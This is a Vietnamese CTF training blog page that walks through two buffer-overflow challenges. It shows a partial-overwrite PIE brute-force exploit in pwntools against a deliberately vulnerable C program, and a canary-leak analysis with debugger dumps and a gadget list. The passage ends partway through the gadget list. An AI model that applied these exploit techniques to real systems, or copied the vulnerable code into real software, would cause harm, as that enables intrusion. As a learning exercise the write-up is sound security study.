<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js dark">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>training - Hjn4 Blog</title>


        <!-- Custom HTML head -->
        
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="../../../theme/css/additional.css">

    </head>
    <body>
    <div id="body-container">
        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "dark";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('dark')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var html = document.querySelector('html');
            var sidebar = null;
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item affix "><a href="../../../homepage.html">HOME - Huy Na</a></li><li class="chapter-item affix "><li class="part-title">ROP Emporium</li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/ret2win_challenge.html">ret2win - challenge 1</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/split_challenge.html">split - challenge 2</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/callme_challenge.html">callme - challenge 3</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/write4_challenge.html">write4 - challenge 4</a></li><li class="chapter-item "><a href="../../../blogs/PWN/ROP_Emporium/badchars_challenge.html">badchars - challenge 5</a></li><li class="chapter-item affix "><li class="part-title">Pwnable.tw</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/start_challenge.html">start</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/orw_challenge.html">orw</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/calc_challenge.html">calc</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwnable_tw/3x17_challenge.html">3x17</a></li><li class="chapter-item affix "><li class="part-title">Pwn_Pico</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_Pico/herelibc_challenge.html">Here's a libc </a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_Pico/hijacking_challenge.html">hijacking </a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_Pico/fermat_strins_challenge.html">fermat_strings </a></li><li class="chapter-item affix "><li class="part-title">Pwn from blabla</li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/handy_shellcode_challenge.html">handy shellcode</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/pwn07_challenge.html">pwn07 - ret2libc vs ROP</a></li><li class="chapter-item "><a href="../../../blogs/PWN/Pwn_from_blabla/got_formatstring_challenge.html">GOT overwrite with format string</a></li><li class="chapter-item expanded "><a href="../../../blogs/PWN/Pwn_from_blabla/training.html" class="active">training</a></li><li class="chapter-item affix "><li class="part-title">Assembly</li><li class="chapter-item "><a href="../../../blogs/Assembly/Session_1.html">Session 1</a></li><li class="chapter-item "><a href="../../../blogs/Assembly/Session_2.html">Session 2</a></li><li class="chapter-item affix "><li class="part-title">RE_Pico</li><li class="chapter-item "><a href="../../../blogs/RE_Pico/ARMssembly_0.html">ARMssembly 0</a></li><li class="chapter-item "><a href="../../../blogs/RE_Pico/ARMssembly_1.html">ARMssembly 1</a></li><li class="chapter-item "><a href="../../../blogs/RE_Pico/ARMssembly_2.html">ARMssembly 2</a></li><li class="chapter-item affix "><li class="part-title">RE_from_blabla</li><li class="chapter-item "><a href="../../../blogs/RE_from_blabla/problems.html">training</a></li><li class="chapter-item affix "><li class="part-title">Docker</li><li class="chapter-item "><a href="../../../blogs/Docker/tips.html">Some tips for ctf</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <!-- Track and set sidebar scroll position -->
        <script>
            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
            sidebarScrollbox.addEventListener('click', function(e) {
                if (e.target.tagName === 'A') {
                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
                }
            }, { passive: true });
            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
            sessionStorage.removeItem('sidebar-scroll');
            if (sidebarScrollTop) {
                // preserve sidebar scroll position when navigating via links within sidebar
                sidebarScrollbox.scrollTop = sidebarScrollTop;
            } else {
                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
                var activeSection = document.querySelector('#sidebar .active');
                if (activeSection) {
                    activeSection.scrollIntoView({ block: 'center' });
                }
            }
        </script>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Hjn4 Blog</h1>

                    <div class="right-buttons">

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="training"><a class="header" href="#training">Training</a></h1>
<h2 id="buffer-over-flow"><a class="header" href="#buffer-over-flow"><em><strong>Buffer over flow</strong></em></a></h2>
<ul>
<li><a href="#training-brute-pie">Training brute Pie</a></li>
<li><a href="#training-leak-pie-canary">Training leak Pie Canary</a></li>
<li><a href="#training-leak-with-read">Training leak with read</a></li>
</ul>
<h2 id="training-brute-pie"><a class="header" href="#training-brute-pie">training-brute-pie</a></h2>
<p><a href="https://github.com/Hjn4Pwn/Pwn/tree/main/pwn_from_blabla/training/chall_bof/bof_noCanary">binary file and solve code</a></p>
<h3 id="file"><a class="header" href="#file">file</a></h3>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/bof_noCanary$ checksec bof_noCanary
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/bof_noCanary/bof_noCanary'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/bof_noCanary$ file bof_noCanary
bof_noCanary: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6aac54d927d24c8ba8aba571154604d441400e74, for GNU/Linux 3.2.0, not stripped

</code></pre>
<h3 id="source"><a class="header" href="#source">Source</a></h3>
<pre><code class="language-c">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;


void vuln(char* s)
{
    char buf[0x20];
    if(strlen(s) &gt; 0x40){
        puts(&quot;Buffer too long!!&quot;);
        _exit(-1);
    }
    memcpy(buf,s,strlen(s));
}

int main(int argc, char** argv, char** envp)
{
    if(argc != 2){
        printf(&quot;Usage: %s &lt;buffer&gt;\n&quot;, argv[0]);
        return -1;
    }
    if(strlen(argv[1]) &gt; 0x40){
        puts(&quot;Buffer too long!!&quot;);
        return -1;
    }
    vuln(argv[1]);
    return 0;
}
void w1n(){
    char* argv[] = { &quot;:))&quot;, NULL};
    execve(&quot;/bin/sh&quot;,argv,NULL);
}

</code></pre>
<p>Khi mà Pie được bật, thì trong đầu mình ban đầu chỉ có leak và leak. Cơ mà không khả thi khi mà muốn vào được <strong>printf hay puts</strong> cho việc leak thì đếu sẽ exit ngay sau đó. chẳng thể ghi đè return address nên chẳng có chuyện quay lại hàm main cho payload lấy shell, điều khiển luồng.</p>
<p>Cơ mà:</p>
<pre><code class="language-shell">pwndbg&gt; info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001090  __cxa_finalize@plt
0x00000000000010a0  _exit@plt
0x00000000000010b0  puts@plt
0x00000000000010c0  strlen@plt
0x00000000000010d0  printf@plt
0x00000000000010e0  execve@plt
0x00000000000010f0  memcpy@plt
0x0000000000001100  _start
0x0000000000001130  deregister_tm_clones
0x0000000000001160  register_tm_clones
0x00000000000011a0  __do_global_dtors_aux
0x00000000000011e0  frame_dummy
0x00000000000011e9  vuln
0x0000000000001249  main
0x00000000000012d4  w1n
0x0000000000001314  _fini

</code></pre>
<p>cơ chế của pie thì kiểu như libc, libc_base sẽ thay đổi mỗi khi run binary, trong khi đó offset thì không. thêm nữa, pie_base sẽ có 3 bit cuối = 0. Vậy nên khi mà pie_base + offset với offset như trên thì 3 bits cuối của addr sẽ không khác 3 bits cuối của offset với hàm tường ứng.</p>
<p>Ví dụ <strong>w1n</strong> có offset là <strong>0x12d4</strong> thì địa chỉ của hàm <strong>w1n</strong> sau khi run binary (đã cộng pie_base) sẽ 0x??..??<strong>?2d4</strong>. Còn bit thứ 4 của offset sẽ được cộng vào.EX:</p>
<p>addr sau khi run binary</p>
<pre><code class="language-shell">0x00005555555551e9  vuln
0x0000555555555249  main
0x00005555555552d4  w1n

</code></pre>
<p>pie_base lúc này sẽ là <em><strong>0x0000555555554000</strong></em> nên là ta có thể bruteforce với việc thay vì gửi cả addr win func để overwrite return addr, thì giờ chỉ cần gửi 4 bits tức 2 bytes cuối thoi, tỷ lệ là 1/16 (<strong>?2d4</strong>).</p>
<p>Phần exploit mình sẽ chọn gửi luôn <em><strong>0x52d4</strong></em> gửi nào mà vừa khớp với pie_base có 4 bits cuối là <strong>4</strong>000 thì okela.</p>
<h3 id="exploit-code"><a class="header" href="#exploit-code">exploit code</a></h3>
<pre><code class="language-python">from pwn import *

w1n_addr = 0x52d4
payload = b&quot;a&quot; * 40 + p16(w1n_addr)

while True:
    r = process(['./bof_noCanary', payload])
    r.send(b'ls;cat flag.txt')
    r.interactive()

</code></pre>
<h3 id="result"><a class="header" href="#result">result</a></h3>
<p><em>Có 1 vấn đề là hmmm script này mình vẫn chưa biết cách để auto, chứ phím enter cũng sml với mình lắm ==&quot;</em></p>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/bof_noCanary$ python3 exploit.py
[+] Starting local process './bof_noCanary': pid 6787
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6787)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6790
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6790)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6799
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6799)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6802
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6802)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6805
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6805)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6808
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6808)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6811
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6811)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6814
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6814)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6817
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6817)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6820
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6820)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6823
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6823)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6832
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6832)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6835
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6835)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6838
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6838)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6841
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6841)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6844
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6844)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6847
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Process './bof_noCanary' stopped with exit code -11 (SIGSEGV) (pid 6847)
[*] Got EOF while sending in interactive
[+] Starting local process './bof_noCanary': pid 6850
[*] Switching to interactive mode
$
bof.c  bof_noCanary  core  exploit.py  flag.txt  haiz.py  payload.txt
flag{l0ca1_fl4g_but_w3_w0n}

</code></pre>
<h2 id="training-leak-with-read"><a class="header" href="#training-leak-with-read">training-leak-with-read</a></h2>
<p><a href="https://github.com/Hjn4Pwn/Pwn/tree/main/pwn_from_blabla/training/chall_bof/passStore_NOPIE">binary file and solve code</a></p>
<h3 id="file-1"><a class="header" href="#file-1">file</a></h3>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE$ checksec passStore_NOPIE
[*] '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE$ file passStore_NOPIE
passStore_NOPIE: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7110eba217e2f468c9b3c94091bf86bdda5d5d33, for GNU/Linux 3.2.0, not stripped

</code></pre>
<h3 id="ida"><a class="header" href="#ida">IDA</a></h3>
<h4 id="main-func"><a class="header" href="#main-func">main func</a></h4>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  passStore();
  return 0;
}

</code></pre>
<h4 id="passstore-func"><a class="header" href="#passstore-func">passStore func</a></h4>
<pre><code class="language-c">unsigned __int64 passStore()
{
  char buf[56]; // [rsp+0h] [rbp-40h] BYREF
  unsigned __int64 v2; // [rsp+38h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf(&quot;Type the password: &quot;);
  read(0, buf, 0x300uLL);
  printf(&quot;You typed %s\n&quot;, buf);
  printf(&quot;Retype: &quot;);
  read(0, buf, 0x300uLL);
  return v2 - __readfsqword(0x28u);
}

</code></pre>
<p>Oke, ở đây ta có 2 lần nhập, với <em>read</em>, no pie, canary enable =&gt; leak thứ gì đấy.</p>
<p>Thì đầu tiên, mình sẽ leak canary trước cái đã rồi tính tiếp.</p>
<pre><code class="language-shell">pwndbg&gt; b* passStore + 91
Breakpoint 2 at 0x4011ff
pwndbg&gt; c
Continuing.
Type the password: aaaaaaaaaaaaa

Breakpoint 2, 0x00000000004011ff in passStore ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
*RAX  0x0
 RBX  0x0
*RCX  0x7ffff7ea1992 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0x300
*RDI  0x402018 ◂— 'You typed %s\n'
*RSI  0x7fffffffdfb0 ◂— 'aaaaaaaaaaaaa\n'
*R8   0x13
 R9   0x7ffff7fc9040 (_dl_fini) ◂— endbr64
*R10  0x7ffff7d935e8 ◂— 0xf001200001a64
*R11  0x246
 R12  0x7fffffffe118 —▸ 0x7fffffffe35f ◂— '/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE/passStore_NOPIE'
 R13  0x401245 (main) ◂— endbr64
 R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401160 (__do_global_dtors_aux) ◂— endbr64
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
*RBP  0x7fffffffdff0 —▸ 0x7fffffffe000 ◂— 0x1
*RSP  0x7fffffffdfb0 ◂— 'aaaaaaaaaaaaa\n'
*RIP  0x4011ff (passStore+91) ◂— call 0x401090
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
 ► 0x4011ff &lt;passStore+91&gt;     call   printf@plt                      &lt;printf@plt&gt;
        format: 0x402018 ◂— 'You typed %s\n'
        vararg: 0x7fffffffdfb0 ◂— 'aaaaaaaaaaaaa\n'

   0x401204 &lt;passStore+96&gt;     lea    rax, [rip + 0xe1b]
   0x40120b &lt;passStore+103&gt;    mov    rdi, rax
   0x40120e &lt;passStore+106&gt;    mov    eax, 0
   0x401213 &lt;passStore+111&gt;    call   printf@plt                      &lt;printf@plt&gt;

   0x401218 &lt;passStore+116&gt;    lea    rax, [rbp - 0x40]
   0x40121c &lt;passStore+120&gt;    mov    edx, 0x300
   0x401221 &lt;passStore+125&gt;    mov    rsi, rax
   0x401224 &lt;passStore+128&gt;    mov    edi, 0
   0x401229 &lt;passStore+133&gt;    call   read@plt                      &lt;read@plt&gt;

   0x40122e &lt;passStore+138&gt;    nop
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsi rsp 0x7fffffffdfb0 ◂— 'aaaaaaaaaaaaa\n'
01:0008│         0x7fffffffdfb8 ◂— 0xa6161616161 /* 'aaaaa\n' */
02:0010│         0x7fffffffdfc0 —▸ 0x7ffff7fa7780 (_IO_2_1_stdout_) ◂— 0xfbad2887
03:0018│         0x7fffffffdfc8 —▸ 0x7ffff7e0e5ff (setbuffer+191) ◂— test dword ptr [rbx], 0x8000
04:0020│         0x7fffffffdfd0 ◂— 0x0
05:0028│         0x7fffffffdfd8 ◂— 0x0
06:0030│         0x7fffffffdfe0 —▸ 0x7fffffffe000 ◂— 0x1
07:0038│         0x7fffffffdfe8 ◂— 0x7b1aaee79b5cb100
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0         0x4011ff passStore+91
   1         0x40127f main+58
   2   0x7ffff7db6d90 __libc_start_call_main+128
   3   0x7ffff7db6e40 __libc_start_main+128
   4         0x4010d5 _start+37
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&gt; canary
AT_RANDOM = 0x7fffffffe339 # points to (not masked) global canary value
Canary    = 0x7b1aaee79b5cb100 (may be incorrect on != glibc)
Found valid canaries on the stacks:
00:0000│  0x7fffffffdfe8 ◂— 0x7b1aaee79b5cb100
00:0000│  0x7fffffffe098 ◂— 0x7b1aaee79b5cb100
pwndbg&gt;

</code></pre>
<p>t thấy là canary ở ngay dưới vị trí stack lưu chuỗi của mình, cách 7 stacks, tức là 7*8 = 56 bytes, thế thì chỉ cần nhập 56 bytes, theo cơ chế của <strong>read</strong> thì chưa gặp byte null là nó chưa dừng lại, vì yêu cứ đâm đầu í. Nên khi mà mình nhập vào 56 bytes, tới ngay cái vị trí của thg canary, ở đấy làm gì có null. thế là ẻm dính luôn với thg buf, lún printf ra thì đi theo buf luôn, tới cuối mơí gặp null.</p>
<p>Oke vậy thì chốt lại là với *<strong>payload = b&quot;a&quot;<em>56</em></strong> ta sẽ leak được canary. sau khi leak được rồi thì với payload thứ 2, ta sẽ điều khiển luồng thực thi của chương trình. tuy nhiên có 2 thứ: 1 là ret cách str ta nhập vào mấy bytes, 2 là ret đi đâu.</p>
<pre><code class="language-shell">► 0x401229 &lt;passStore+133&gt;    call   read@plt                      &lt;read@plt&gt;
        fd: 0x0 (/dev/pts/0)
        buf: 0x7fffffffdfb0 ◂— 0x7fff0a333231
        nbytes: 0x300
</code></pre>
<p>string ta nhập sẽ được lưu ở buf :<strong>0x7fffffffdfb0</strong></p>
<pre><code class="language-shell">──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
 ► 0x401244       &lt;passStore+160&gt;                 ret                                  &lt;0x40127f; main+58&gt;
    ↓
   0x40127f       &lt;main+58&gt;                       mov    eax, 0
   0x401284       &lt;main+63&gt;                       pop    rbp
   0x401285       &lt;main+64&gt;                       ret
    ↓
   0x7ffff7db6d90 &lt;__libc_start_call_main+128&gt;    mov    edi, eax
   0x7ffff7db6d92 &lt;__libc_start_call_main+130&gt;    call   exit                &lt;exit&gt;

   0x7ffff7db6d97 &lt;__libc_start_call_main+135&gt;    call   __nptl_deallocate_tsd                &lt;__nptl_deallocate_tsd&gt;

   0x7ffff7db6d9c &lt;__libc_start_call_main+140&gt;    lock dec dword ptr [rip + 0x1ef505]  &lt;__nptl_nthreads&gt;
   0x7ffff7db6da3 &lt;__libc_start_call_main+147&gt;    sete   al
   0x7ffff7db6da6 &lt;__libc_start_call_main+150&gt;    test   al, al
   0x7ffff7db6da8 &lt;__libc_start_call_main+152&gt;    jne    __libc_start_call_main+168                &lt;__libc_start_call_main+168&gt;
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdff8 —▸ 0x40127f (main+58) ◂— mov eax, 0
01:0008│ rbp 0x7fffffffe000 ◂— 0x1
02:0010│     0x7fffffffe008 —▸ 0x7ffff7db6d90 (__libc_start_call_main+128) ◂— mov edi, eax
03:0018│     0x7fffffffe010 ◂— 0x0

</code></pre>
<p>Còn ret: <strong>0x7fffffffdff8</strong></p>
<pre><code class="language-python">&gt;&gt;&gt; 0x7fffffffdff8 - 0x7fffffffdfb0
72

</code></pre>
<p>Ta thấy là mới chỉ có mỗi canary, còn phải viết ovwr về đâu, mình thử vào xem các gadget có gì okela k:</p>
<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwn_from_blabla/training/chall_bof/passStore_NOPIE$ ROPgadget --binary passStore_NOPIE
Gadgets information
============================================================
0x000000000040110b : add bh, bh ; loopne 0x401175 ; nop ; ret
0x00000000004010dc : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401280 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040117a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004010de : add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401282 : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040123b : add byte ptr [rbp + rax - 0x18], dh ; sub eax, 0xc9fffffe ; ret
0x000000000040117b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401179 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040110a : add dil, dil ; loopne 0x401175 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040117c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401177 : add eax, 0x2eeb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040123d : add eax, 0xfffe2de8 ; dec ecx ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x000000000040122d : call qword ptr [rax - 0x7ba74b8]
0x0000000000401014 : call rax
0x0000000000401193 : cli ; jmp 0x401120
0x0000000000401199 : cli ; push rbp ; mov rbp, rsp ; push rdi ; pop rdi ; ret
0x00000000004010e3 : cli ; ret
0x000000000040128b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401242 : dec ecx ; ret
0x0000000000401190 : endbr64 ; jmp 0x401120
0x00000000004010e0 : endbr64 ; ret
0x000000000040119d : in eax, 0x57 ; pop rdi ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401105 : je 0x401110 ; mov edi, 0x404048 ; jmp rax
0x0000000000401147 : je 0x401150 ; mov edi, 0x404048 ; jmp rax
0x000000000040103a : jmp 0x401020
0x0000000000401194 : jmp 0x401120
0x0000000000401178 : jmp 0x4011a8
0x000000000040100b : jmp 0x4840103f
0x000000000040110c : jmp rax
0x0000000000401243 : leave ; ret
0x000000000040110d : loopne 0x401175 ; nop ; ret
0x0000000000401176 : mov byte ptr [rip + 0x2eeb], 1 ; pop rbp ; ret
0x000000000040127f : mov eax, 0 ; pop rbp ; ret
0x000000000040119c : mov ebp, esp ; push rdi ; pop rdi ; ret
0x0000000000401107 : mov edi, 0x404048 ; jmp rax
0x000000000040119b : mov rbp, rsp ; push rdi ; pop rdi ; ret
0x00000000004011a1 : nop ; pop rbp ; ret
0x000000000040110f : nop ; ret
0x000000000040118c : nop dword ptr [rax] ; endbr64 ; jmp 0x401120
